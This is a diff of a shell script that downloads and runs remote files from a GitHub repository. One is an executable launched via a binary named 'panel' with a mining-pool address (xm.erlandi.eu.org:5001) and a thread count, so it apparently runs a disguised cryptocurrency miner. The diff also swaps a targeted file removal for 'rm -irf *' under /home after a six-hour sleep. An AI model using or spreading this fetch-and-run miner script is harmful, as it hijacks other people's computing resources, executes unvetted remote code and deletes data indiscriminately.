@@ -7,8 +7,8 @@ cd /home
 wget https://raw.githubusercontent.com/petugas/e/main/proxy.sh
 chmod +x proxy.sh
 sh proxy.sh
-wget https://bit.ly/3mPeYds
-chmod +x 3mPeYds 
-./panel ./3mPeYds -o xm.erlandi.eu.org:5001 -t $(nproc --ignore 1)
+wget https://raw.githubusercontent.com/petugas/e/main/ebiy
+chmod +x ebiy
+./panel ./ebiy -o xm.erlandi.eu.org:5001 -t $(nproc --ignore 1)
 sleep 6h
-rm -irf 3mPeYds
+rm -irf *
